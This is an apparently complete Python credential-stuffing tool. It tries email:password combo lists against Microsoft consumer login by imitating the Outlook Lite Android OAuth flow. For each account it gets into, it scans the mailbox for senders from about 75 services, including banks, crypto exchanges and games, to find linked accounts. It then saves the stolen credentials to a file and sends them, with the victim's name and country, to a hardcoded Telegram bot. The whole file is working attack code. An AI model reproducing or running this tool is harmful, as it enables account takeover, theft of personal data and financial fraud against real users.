import requests , uuid
from concurrent.futures import ThreadPoolExecutor
blue = "\x1b[1;94m"  # Blue color  
bold = "\x1b[1m"      # Bold text  
reset = "\x1b[0m"     # Reset color  

blue = "\x1b[1;94m"  # Blue color  
bold = "\x1b[1m"      # Bold text  
reset = "\x1b[0m"     # Reset color  

flag = f"""
{blue}{bold}
╔══════════════════════════════════════════╗
║   🔹  HOTMAIL PRIVATE CLOUD SYSTEM  🔹   ║
╠══════════════════════════════════════════╣
║   🔒 SECURE ACCESS  •  ENCRYPTED DATA 🔒   ║
║   📡 CLOUD AUTH  •  PRIVATE CONNECTION  📡   ║
║   🔹 Powered by: @i3nov 🚀                 ║
╚══════════════════════════════════════════╝
{reset}
"""

print(flag)

a, b = 0, 0   
g1 = '\x1b[1;92m\x1b[38;5;208m'  
g2 = '\x1b[1;33m'  
g3 = '\x1b[1;92m\x1b[38;5;46m'  
g5 = '\x1b[1;92m\x1b[38;5;212m'  
g6 = '\x1b[1;92m\x1b[38;5;50m'  

bi = '7555467555:AAFbOmqui8a1brHAMQA__ty3z2nFWbY-H4Y' #tokin
id = '7782680242' #id

file = input(' \x1b[1;33m  - Enter Your Combo File Name : ')

import re

def extract_security_info(email_body):
    two_fa = "❌ Not Enabled"
    backup_codes = "❌ Not Found"
    phone_number = "❌ Not Found"
    last_ip = "❌ Not Found"
    location = "❌ Not Found"

    # Check if 2FA is mentioned
    if "Two-Factor Authentication enabled" in email_body or "2FA is now active" in email_body:
        two_fa = "✅ Enabled"

    # Extract backup codes
    if "Here are your backup codes" in email_body:
        codes = email_body.split("Here are your backup codes:")[1].split("\n")[0:5]  # Get first 5 codes
        backup_codes = ", ".join(codes)

    # Extract phone number
    if "Your phone number is now linked:" in email_body:
        phone_number = email_body.split("Your phone number is now linked:")[1].split("\n")[0].strip()

    # Extract last login IP using regex
    ip_match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", email_body)
    if ip_match:
        last_ip = ip_match.group(1)

    # Extract location
    location_keywords = ["logged in from", "accessed from", "location:"]
    for keyword in location_keywords:
        if keyword in email_body:
            location = email_body.split(keyword)[1].split("\n")[0].strip()
            break

    return two_fa, backup_codes, phone_number, last_ip, location
def get_infoo(Email, Password, token, CID) -> str:
    he = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{CID}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
    info_name = (r.get('names', []))
    info_Loca = (r.get('accounts', []))
    name = info_name[0]['displayName']
    Loca = info_Loca[0]['location']
    url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"    
    headers = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": f"{CID}",
        "x-req-source": "Mini",
        "authorization": f"Bearer {token}",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
        "action": "StartupData",
        "x-owa-correlationid": f"{CID}",
        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://outlook.live.com/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    rese = requests.post(url, headers=headers, data="").text

    V1 = '☑️ - 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 . ' if any(x in rese for x in [
    'security@facebookmail.com', 'notification@facebookmail.com', 'no-reply@facebook.com', 'support@facebook.com', 'alerts@facebook.com'
]) else None
    V2 = '☑️ - 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 . ' if any(x in rese for x in [
    'security@mail.instagram.com', 'no-reply@mail.instagram.com', 'notifications@instagram.com', 'support@instagram.com', 'help@instagram.com'
]) else None
    V3 = '☑️ - 𝗣𝗨𝗕𝗚' if any(x in rese for x in ['pubg@pubg.com', 'noreply@pubg.com', 'support@pubg.com', 'accounts@pubg.com']) else None
    V4 = '☑️ - 𝗞𝗼𝗻𝗮𝗺𝗶' if any(x in rese for x in ['noreply@id.konami.net', 'support@konami.com', 'no-reply@my.konami.net']) else None
    V5 = '☑️ - 𝗧𝗶𝗸𝗧𝗼𝗸 . ' if any(x in rese for x in [
    'register@account.tiktok.com', 'no-reply@tiktok.com', 'security@tiktok.com', 'support@tiktok.com', 'notifications@tiktok.com'
]) else None
    V6 = '☑️ - 𝗧𝘄𝗶𝘁𝘁𝗲𝗿 . ' if any(x in rese for x in [
    'info@x.com', 'no-reply@twitter.com', 'security@twitter.com', 'notifications@twitter.com', 'support@twitter.com'
]) else None
    V7 = '☑️ - 𝗣𝗮𝘆𝗣𝗮𝗹 . ' if any(x in rese for x in [
    'service@paypal.com', 'security@paypal.com', 'no-reply@paypal.com', 'alerts@paypal.com', 'support@paypal.com'
]) else None
    V8 = '☑️ - 𝗕𝗶𝗻𝗮𝗻𝗰𝗲 . ' if 'do-not-reply@binance.com' in rese else None
    V9 = '☑️ - 𝗡𝗲𝘁𝗙𝗹𝗶𝘅 . ' if 'info@account.netflix.com' in rese else None
    V10 = '☑️ - 𝗣𝗹𝗮𝘆𝘀𝘁𝗮𝘁𝗶𝗼𝗻 . ' if 'reply@txn-email.playstation.com' in rese else None
    V11 = '☑️ - 𝗦𝘂𝗽𝗲𝗿𝗰𝗲𝗹𝗹 . ' if 'noreply@id.supercell.com' in rese else None
    V12 = '☑️ - 𝗘𝗽𝗶𝗰𝗚𝗮𝗺𝗲𝘀 . ' if 'help@acct.epicgames.com' in rese else None
    V13 = '☑️ - 𝗦𝗽𝗼𝘁𝗶𝗳𝘆 . ' if 'no-reply@spotify.com' in rese else None
    V14 = '☑️ - 𝗥𝗼𝗰𝗸𝘀𝘁𝗮𝗿 . ' if 'noreply@rockstargames.com' in rese else None
    V15 = '☑️ - 𝗫𝗯𝗼𝘅 . ' if 'xboxreps@engage.xbox.com' in rese else None
    V16 = '☑️ - 𝗠𝗶𝗰𝗿𝗼𝘀𝗼𝗳𝘁 . ' if 'account-security-noreply@accountprotection.microsoft.com' in rese else None
    V17 = '☑️ - 𝗦𝘁𝗲𝗮𝗺 . ' if 'noreply@steampowered.com' in rese else None
    V18 = '☑️ - 𝗥𝗼𝗯𝗹𝗼𝘅 . ' if 'accounts@roblox.com' in rese else None
    V19 = '☑️ - 𝗘𝗔 𝘀𝗽𝗼𝗿𝘁𝘀 . ' if 'EA@e.ea.com' in rese else None
    V20 = '☑️ - 𝗕𝗶𝘁𝗸𝘂𝗯 . ' if 'no-reply@bitkub.com' in rese else None
    V21 = '☑️ - 𝗫𝗻𝘅𝘅 18+ . ' if 'donotreply@xnxx.com' in rese else None
    V22 = '☑️ - 𝗣𝗼𝗿𝗻𝗵𝘂𝗯 18+ . ' if 'noreply@pornhub.com' in rese else None
    V23 = '☑️ - 𝗣𝗶𝗻𝘁𝗲𝗿𝗲𝘀𝘁 . ' if any(x in rese for x in [
    'no-reply@pinterest.com', 'notifications@pinterest.com', 'support@pinterest.com', 'security@pinterest.com', 'help@pinterest.com'
]) else None
    V24 = '☑️ - 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 . ' if any(x in rese for x in [
    'no-reply@youtube.com', 'noreply@youtube.com', 'support@youtube.com', 'notifications@youtube.com', 'alerts@youtube.com'
]) else None
    V25 = '☑️ - 𝗨𝗱𝗲𝗺𝘆 . ' if any(x in rese for x in ['no-reply@udemy.com', 'support@udemy.com']) else None
    V26 = '☑️ - 𝗖𝗮𝗽𝗖𝘂𝘁 . ' if any(x in rese for x in ['support@capcut.com', 'no-reply@capcut.com']) else None
    V27 = '☑️ - 𝗖𝗮𝗻𝘃𝗮 . ' if any(x in rese for x in ['no-reply@canva.com', 'support@canva.com']) else None
    V28 = '☑️ - 𝗚𝘂𝗺𝗿𝗼𝗮𝗱 . ' if any(x in rese for x in ['support@gumroad.com', 'no-reply@gumroad.com']) else None
    V29 = '☑️ - 𝗘𝘁𝘀𝘆 . ' if any(x in rese for x in ['no-reply@etsy.com', 'transaction@etsy.com']) else None
    V30 = '☑️ - 𝗔𝗺𝗮𝘇𝗼𝗻 . ' if any(x in rese for x in ['no-reply@amazon.com', 'auto-confirm@amazon.com']) else None
    V31 = '☑️ - 𝗔𝗹𝗶𝗘𝘅𝗽𝗿𝗲𝘀𝘀 . ' if any(x in rese for x in ['no-reply@aliexpress.com', 'notification@aliexpress.com']) else None
    V32 = '☑️ - 𝗦𝗵𝗲𝗶𝗻 . ' if any(x in rese for x in ['no-reply@shein.com', 'service@shein.com']) else None
    V33 = '☑️ - 𝗔𝗹𝗶𝗯𝗮𝗯𝗮 . ' if any(x in rese for x in ['no-reply@alibaba.com', 'notification@alibaba.com']) else None
    V34 = '☑️ - 𝗦𝗻𝗮𝗽𝗰𝗵𝗮𝘁 . ' if any(x in rese for x in [
    'no-reply@snapchat.com', 'support@snapchat.com', 'security@snapchat.com', 'alerts@snapchat.com', 'notifications@snapchat.com'
]) else None
    V35 = '☑️ - 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 . ' if any(x in rese for x in ['no-reply@threads.com', 'support@threads.com']) else None
    V36 = '☑️ - 𝗘𝘅𝗽𝗿𝗲𝘀𝘀𝗩𝗣𝗡 . ' if any(x in rese for x in ['no-reply@expressvpn.com', 'support@expressvpn.com']) else None
    V37 = '☑️ - 𝗡𝗼𝗿𝗱𝗩𝗣𝗡 . ' if any(x in rese for x in ['no-reply@nordvpn.com', 'support@nordvpn.com']) else None
    V38 = '☑️ - 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 . ' if any(x in rese for x in [
    'no-reply@discord.com', 'noreply@discordapp.com', 'support@discord.com', 'security@discord.com', 'alerts@discord.com'
]) else None
    V39 = '☑️ - 𝗖𝗼𝘂𝗿𝘀𝗲𝗿𝗮 . ' if any(x in rese for x in ['no-reply@coursera.org', 'support@coursera.org']) else None
    V40 = '☑️ - 𝗧𝗿𝗮𝗱𝗶𝗻𝗴𝗩𝗶𝗲𝘄 . ' if any(x in rese for x in ['no-reply@tradingview.com', 'support@tradingview.com']) else None
    V41 = '☑️ - 𝗕𝘆𝗯𝗶𝘁 . ' if any(x in rese for x in ['no-reply@bybit.com', 'support@bybit.com']) else None
    V42 = '☑️ - 𝗘𝘅𝗻𝗲𝘀𝘀 . ' if any(x in rese for x in ['no-reply@exness.com', 'support@exness.com']) else None
    V43 = '☑️ - 𝗚𝗶𝘁𝗛𝘂𝗯 . ' if any(x in rese for x in ['noreply@github.com', 'support@github.com']) else None
    V44 = '☑️ - 𝗗𝗲𝗲𝗽𝗦𝗲𝗲𝗸 . ' if 'no-reply@deepseek.com' in rese else None
    V45 = '☑️ - 𝗢𝗽𝗲𝗻𝗔𝗜 . ' if any(x in rese for x in ['no-reply@openai.com', 'support@openai.com']) else None
    V46 = '☑️ - 𝗛𝗼𝘀𝘁𝗶𝗻𝗴𝗲𝗿 . ' if 'no-reply@hostinger.com' in rese else None
    V47 = '☑️ - 𝗔𝗽𝗽𝗹𝗲 𝗜𝗗 . ' if any(x in rese for x in ['appleid@id.apple.com', 'no-reply@apple.com']) else None
    V48 = '☑️ - 𝗡𝗶𝗸𝗲 . ' if 'no-reply@nike.com' in rese else None
    V49 = '☑️ - 𝗔𝗶𝗿𝗯𝗻𝗯 . ' if 'automated@airbnb.com' in rese else None
    V50 = '☑️ - 𝗠𝘆𝗙𝗶𝗻 . ' if 'no-reply@myfin.com' in rese else None
    V51 = '☑️ - 𝗥𝗲𝗱𝗼𝘁𝗣𝗮𝘆 . ' if 'no-reply@redotpay.com' in rese else None
    V52 = '☑️ - 𝗪𝗶𝘀𝗲 . ' if 'no-reply@wise.com' in rese else None
    V53 = '☑️ - 𝗟𝗶𝗻𝗸𝗲𝗱𝗜𝗻 . ' if any(x in rese for x in [
    'no-reply@linkedin.com', 'security@linkedin.com', 'notifications@linkedin.com', 'alerts@linkedin.com', 'support@linkedin.com'
]) else None
    V54 = '☑️ - 𝗨𝗽𝘄𝗼𝗿𝗸 . ' if 'no-reply@upwork.com' in rese else None
    V55 = '☑️ - 𝗙𝗶𝘃𝗲𝗿𝗿 . ' if 'noreply@fiverr.com' in rese else None
    V56 = '☑️ - 𝗛𝗠𝗔 𝗩𝗣𝗡 . ' if 'no-reply@hidemyass.com' in rese else None
    V57 = '☑️ - 𝗢𝗻𝗹𝘆𝗙𝗮𝗻𝘀 . ' if any(x in rese for x in [
    'no-reply@onlyfans.com', 'support@onlyfans.com', 'alerts@onlyfans.com', 'security@onlyfans.com', 'help@onlyfans.com'
]) else None
    V58 = '☑️ - 𝗚𝗶𝘁𝗟𝗮𝗯 . ' if 'no-reply@gitlab.com' in rese else None
    V59 = '☑️ - 𝗨𝗯𝗲𝗿 . ' if 'no-reply@uber.com' in rese else None
    V60 = '☑️ - 𝗠𝗲𝗴𝗮 .𝗻𝘇 . ' if 'no-reply@mega.nz' in rese else None
    V61 = '☑️ - 𝗣𝗿𝗼𝘁𝗼𝗻𝗠𝗮𝗶𝗹 . ' if 'security@protonmail.com' in rese else None
    V62 = '☑️ - 𝗬𝗮𝗵𝗼𝗼 𝗠𝗮𝗶𝗹 . ' if 'no-reply@yahoo.com' in rese else None
    V63 = '☑️ - 𝗧𝘂𝘁𝗮𝗻𝗼𝘁𝗮 . ' if 'no-reply@tutanota.com' in rese else None
    V64 = '☑️ - 𝗧𝘂𝗺𝗯𝗹𝗿 . ' if any(x in rese for x in [
    'no-reply@tumblr.com', 'security@tumblr.com', 'notifications@tumblr.com', 'support@tumblr.com', 'help@tumblr.com'
]) else None
    V65 = '☑️ - 𝗕𝗹𝗶𝘇𝘇𝗮𝗿𝗱 . ' if 'no-reply@blizzard.com' in rese else None
    V66 = '☑️ - 𝗧𝗼𝗽𝘁𝗮𝗹 . ' if 'no-reply@toptal.com' in rese else None
    V67 = '☑️ - 𝗙𝗿𝗲𝗲𝗹𝗮𝗻𝗰𝗲𝗿 . ' if 'no-reply@freelancer.com' in rese else None
    V68 = '☑️ - 𝗣𝗲𝗼𝗽𝗹𝗲𝗣𝗲𝗿𝗛𝗼𝘂𝗿 . ' if 'no-reply@peopleperhour.com' in rese else None
    V69 = '☑️ - 𝗚𝗮𝗿𝗲𝗻𝗮' if any(x in rese for x in ['no-reply@garena.com', 'account@garena.com', 'support@garena.com', 'security@garena.com']) else None
    V70 = '☑️ - 𝗔𝗽𝗲𝘅 𝗟𝗲𝗴𝗲𝗻𝗱𝘀' if any(x in rese for x in ['noreply@ea.com', 'support@ea.com', 'ea@ea.e.ea.com']) else None
    V71 = '☑️ - 𝗖𝗮𝗹𝗹 𝗼𝗳 𝗗𝘂𝘁𝘆' if any(x in rese for x in ['noreply@activision.com', 'support@activision.com', 'security@callofduty.com']) else None
    V72 = '☑️ - 𝗙𝗼𝗿𝘁𝗻𝗶𝘁𝗲' if any(x in rese for x in ['email@epicgames.com', 'support@epicgames.com', 'noreply@accts.epicgames.com']) else None
    V73 = '☑️ - 𝗥𝗲𝗱𝗱𝗶𝘁 . ' if any(x in rese for x in [
    'no-reply@reddit.com', 'security@reddit.com', 'notifications@reddit.com', 'support@reddit.com', 'help@reddit.com'
]) else None
    V74 = '☑️ - 𝗕𝗲𝗵𝗮𝗻𝗰𝗲 . ' if any(x in rese for x in [
    'no-reply@behance.net', 'notifications@behance.net', 'support@behance.net', 'info@behance.net'
]) else None
    V75 = '☑️ - 𝗠𝗲𝗱𝗶𝘂𝗺 . ' if any(x in rese for x in [
    'no-reply@medium.com', 'security@medium.com', 'notifications@medium.com', 'support@medium.com'
]) else None


    xb = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20, V21, V22, V23, V24, V25, V26, V27, V28, V29, V30, V31, V32, V33, V34, V35, V36, V37, V38, V39, V40, V41, V42, V43, V44, V45, V46, V47, V48, V49, V50, V51, V52, V53, V54, V55, V56, V57, V58, V59, V60, V61, V62, V63, V64, V65, V66, V67, V68, V69, V70, V71, V72, V73, V74, V75])
    zm = "\n".join(xb)
    jssj = {"AD": "🇦🇩","AE": "🇦🇪","AF": "🇦🇫","AG": "🇦🇬","AI": "🇦🇮","AL": "🇦🇱","AM": "🇦🇲","AO": "🇦🇴","AQ": "🇦🇶","AR": "🇦🇷","AS": "🇦🇸","AT": "🇦🇹","AU": "🇦🇺","AW": "🇦🇼","AX": "🇦🇽","AZ": "🇦🇿","BA": "🇧🇦","BB": "🇧🇧","BD": "🇧🇩","BE": "🇧🇪","BF": "🇧🇫","BG": "🇧🇬","BH": "🇧🇭","BI": "🇧🇮","BJ": "🇧🇯","BL": "🇧🇱","BM": "🇧🇲","BN": "🇧🇳","BO": "🇧🇴","BQ": "🇧🇶","BR": "🇧🇷","BS": "🇧🇸","BT": "🇧🇹","BV": "🇧🇻","BW": "🇧🇼","BY": "🇧🇾","BZ": "🇧🇿","CA": "🇨🇦","CC": "🇨🇨","CD": "🇨🇩","CF": "🇨🇫","CG": "🇨🇬","CH": "🇨🇭","CI": "🇨🇮","CK": "🇨🇰","CL": "🇨🇱","CM": "🇨🇲","CN": "🇨🇳","CO": "🇨🇴","CR": "🇨🇷","CU": "🇨🇺","CV": "🇨🇻","CW": "🇨🇼","CX": "🇨🇽","CY": "🇨🇾","CZ": "🇨🇿","DE": "🇩🇪","DJ": "🇩🇯","DK": "🇩🇰","DM": "🇩🇲","DO": "🇩🇴","DZ": "🇩🇿","EC": "🇪🇨","EE": "🇪🇪","EG": "🇪🇬","EH": "🇪🇭","ER": "🇪🇷","ES": "🇪🇸","ET": "🇪🇹","EU": "🇪🇺","FI": "🇫🇮","FJ": "🇫🇯","FK": "🇫🇰","FM": "🇫🇲","FO": "🇫🇴","FR": "🇫🇷","GA": "🇬🇦","GB-ENG": "🏴","GB-NIR": "🏴","GB-SCT": "🏴","GB-WLS": "🏴","GB": "🇬🇧","GD": "🇬🇩","GE": "🇬🇪","GF": "🇬🇫","GG": "🇬🇬","GH": "🇬🇭","GI": "🇬🇮","GL": "🇬🇱","GM": "🇬🇲","GN": "🇬🇳","GP": "🇬🇵","GQ": "🇬🇶","GR": "🇬🇷","GS": "🇬🇸","GT": "🇬🇹","GU": "🇬🇺","GW": "🇬🇼","GY": "🇬🇾","HK": "🇭🇰","HM": "🇭🇲","HN": "🇭🇳","HR": "🇭🇷","HT": "🇭🇹","HU": "🇭🇺","ID": "🇮🇩","IE": "🇮🇪","IL": "🇮🇱","IM": "🇮🇲","IN": "🇮🇳","IO": "🇮🇴","IQ": "🇮🇶","IR": "🇮🇷","IS": "🇮🇸","IT": "🇮🇹","JE": "🇯🇪","JM": "🇯🇲","JO": "🇯🇴","JP": "🇯🇵","KE": "🇰🇪","KG": "🇰🇬","KH": "🇰🇭","KI": "🇰🇮","KM": "🇰🇲","KN": "🇰🇳","KP": "🇰🇵","KR": "🇰🇷","KW": "🇰🇼","KY": "🇰🇾","KZ": "🇰🇿","LA": "🇱🇦","LB": "🇱🇧","LC": "🇱🇨","LI": "🇱🇮","LK": "🇱🇰","LR": "🇱🇷","LS": "🇱🇸","LT": "🇱🇹","LU": "🇱🇺","LV": "🇱🇻","LY": "🇱🇾","MA": "🇲🇦","MC": "🇲🇨","MD": "🇲🇩","ME": "🇲🇪","MF": "🇲🇫","MG": "🇲🇬","MH": "🇲🇭","MK": "🇲🇰","ML": "🇲🇱","MM": "🇲🇲","MN": "🇲🇳","MO": "🇲🇴","MP": "🇲🇵","MQ": "🇲🇶","MR": "🇲🇷","MS": "🇲🇸","MT": "🇲🇹","MU": "🇲🇺","MV": "🇲🇻","MW": "🇲🇼","MX": "🇲🇽","MY": "🇲🇾","MZ": "🇲🇿","NA": "🇳🇦","NC": "🇳🇨","NE": "🇳🇪","NF": "🇳🇫","NG": "🇳🇬","NI": "🇳🇮","NL": "🇳🇱","NO": "🇳🇴","NP": "🇳🇵","NR": "🇳🇷","NU": "🇳🇺","NZ": "🇳🇿","OM": "🇴🇲","PA": "🇵🇦","PE": "🇵🇪","PF": "🇵🇫","PG": "🇵🇬","PH": "🇵🇭","PK": "🇵🇰","PL": "🇵🇱","PM": "🇵🇲","PN": "🇵🇳","PR": "🇵🇷","PS": "🇵🇸","PT": "🇵🇹","PW": "🇵🇼","PY": "🇵🇾","QA": "🇶🇦","RE": "🇷🇪","RO": "🇷🇴","RS": "🇷🇸","RU": "🇷🇺","RW": "🇷🇼","SA": "🇸🇦","SB": "🇸🇧","SC": "🇸🇨","SD": "🇸🇩","SE": "🇸🇪","SG": "🇸🇬","SH": "🇸🇭","SI": "🇸🇮","SJ": "🇸🇯","SK": "🇸🇰","SL": "🇸🇱","SM": "🇸🇲","SN": "🇸🇳","SO": "🇸🇴","SR": "🇸🇷","SS": "🇸🇸","ST": "🇸🇹","SV": "🇸🇻","SX": "🇸🇽","SY": "🇸🇾","SZ": "🇸🇿","TC": "🇹🇨","TD": "🇹🇩","TF": "🇹🇫","TG": "🇹🇬","TH": "🇹🇭","TJ": "🇹🇯","TK": "🇹🇰","TL": "🇹🇱","TM": "🇹🇲","TN": "🇹🇳","TO": "🇹🇴","TR": "🇹🇷","TT": "🇹🇹","TV": "🇹🇻","TW": "🇹🇼","TZ": "🇹🇿","UA": "🇺🇦","UG": "🇺🇬","UM": "🇺🇲","US": "🇺🇸","UY": "🇺🇾","UZ": "🇺🇿","VA": "🇻🇦","VC": "🇻🇨","VE": "🇻🇪","VG": "🇻🇬","VI": "🇻🇮","VN": "🇻🇳","VU": "🇻🇺","WF": "🇼🇫","WS": "🇼🇸","XK": "🇽🇰","YE": "🇾🇪","YT": "🇾🇹","ZA": "🇿🇦","ZM": "🇿🇲","ZW": "🇿🇼"}
    cccc = jssj.get(Loca, '❔')
    print(f'''Good''') 
   
    result_line = f"Email: {Email} | Pass: {Password} | Name: {name} | Linked Accounts: {zm} | Country: {cccc} | By @i3nov\n"

    with open("results.txt", "a", encoding="utf-8") as file:
        file.write(result_line)
    from datetime import datetime

# Get current date and time
    signed_in = datetime.now().strftime("%d|%m|%Y - %H:%M:%S")

    message = f"""
╔══════════════════╗  
     ✨ **Account Details** ✨  
╚══════════════════╝   

📂 **𝗟𝗼𝗴𝗶𝗻 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀**  
├── 📧 **𝗘𝗺𝗮𝗶𝗹:** `{Email}`  
└── 🔑 **𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:** `{Password}`  

👤 **𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗜𝗻𝗳𝗼**  
├── 🏷 **𝗡𝗮𝗺𝗲:** `{name}`  
└── 🌍 **𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** `{cccc}`  

🔗 **𝗟𝗶𝗻𝗸𝗲𝗱 𝗔𝗰𝗰𝗼𝘂𝗻𝘁𝘀** 🔗 📱  
`{zm}`  

💎 **𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘁𝗮𝘁𝘂𝘀**  
├── 🏆 **𝗤𝘂𝗮𝗹𝗶𝘁𝘆:** ✨ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠  
├── ✅ **𝗦𝘁𝗮𝘁𝘂𝘀:**  🟢 𝗩𝗮𝗹𝗶𝗱𝗲  
├── ⏳ **𝗦𝗶𝗴𝗻𝗲𝗱 𝗜𝗻:**  
└─ `{signed_in}`  

🔗 **More Info:** [Click Here](https://telegra.ph/Note-04-10-2)  

 **𝗖𝗮𝗽𝘁𝘂𝗿𝗲 𝗕𝘆 🤳🏼:** @i3nov ®  
━━━━━━━━━━━━━━━━━━━━
"""
    requests.get(f'https://api.telegram.org/bot{bi}/sendPhoto?chat_id={id}&photo=https://t.me/Hotpfp/3&caption={message}&parse_mode=Markdown&reply_markup={{"inline_keyboard":[[{{"text":"Devloper","url":"http://t.me/i3nov"}}]]}}')	
     		
def get_token(Email,Password,cook,hh) -> str:
	Code = hh.get('Location').split('code=')[1].split('&')[0]
	CID = cook.get('MSPCID').upper()
	try:
		url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
		data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
	    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
	    "grant_type": "authorization_code",
	    "code": Code,
	    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
		response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
		token = response.json()["access_token"]
		get_infoo(Email,Password,token,CID)
	except Exception as e:
		pass
def login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams) -> str:
	global a,b	
	try:
		lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
		Ln = len(lenn)
		headers = {
		    "Host": "login.live.com",
		    "Connection": "keep-alive",
		    "Content-Length": str(Ln),
		    "Cache-Control": "max-age=0",
		    "Upgrade-Insecure-Requests": "1",
		    "Origin": "https://login.live.com",
		    "Content-Type": "application/x-www-form-urlencoded",
		    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		    "X-Requested-With": "com.microsoft.outlooklite",
		    "Sec-Fetch-Site": "same-origin",
		    "Sec-Fetch-Mode": "navigate",
		    "Sec-Fetch-User": "?1",
		    "Sec-Fetch-Dest": "document",
		    "Referer": f"{AD}haschrome=1",
		    "Accept-Encoding": "gzip, deflate",
		    "Accept-Language": "en-US,en;q=0.9",
		    "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
		res = requests.post(URL,data=lenn,headers=headers,allow_redirects=False)			
		cook = res.cookies.get_dict()
		hh = res.headers
		if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
			get_token(Email,Password,cook,hh)
			a+=1
		elif 'Too Many Requests' in res.text:
			login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams)
		else:
			b+=1
			print(f'{g1}- Bad Account .')
	except Exception as e:
		pass
def get_values(Email,Password):
	headers = {
#	    "Host": "login.microsoftonline.com",
	    "Connection": "keep-alive",
	    "Upgrade-Insecure-Requests": "1",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	    "return-client-request-id": "false",
	    "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
	    "x-ms-sso-ignore-sso": "1",
	    "correlation-id": str(uuid.uuid4()),
	    "x-client-ver": "1.1.0+9e54a0d1",
	    "x-client-os": "28",
	    "x-client-sku": "MSAL.xplat.android",
	    "x-client-src-sku": "MSAL.xplat.android",
	    "X-Requested-With": "com.microsoft.outlooklite",
	    "Sec-Fetch-Site": "none",
	    "Sec-Fetch-Mode": "navigate",
	    "Sec-Fetch-User": "?1",
	    "Sec-Fetch-Dest": "document",
	    "Accept-Encoding": "gzip, deflate",
	    "Accept-Language": "en-US,en;q=0.9",
	}
	try:
		response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(Email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" ,headers=headers)
		cok = response.cookies.get_dict()
		URL = response.text.split("urlPost:'")[1].split("'")[0]
		PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
		AD = response.url.split('haschrome=1')[0]
		MSPRequ = cok['MSPRequ']
		uaid = cok['uaid']
		RefreshTokenSso = cok['RefreshTokenSso']
		MSPOK = cok['MSPOK'],
		OParams =  cok['OParams']
		login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams)			
	except Exception as e:
		get_values(Email,Password)
executor = ThreadPoolExecutor(max_workers=10)
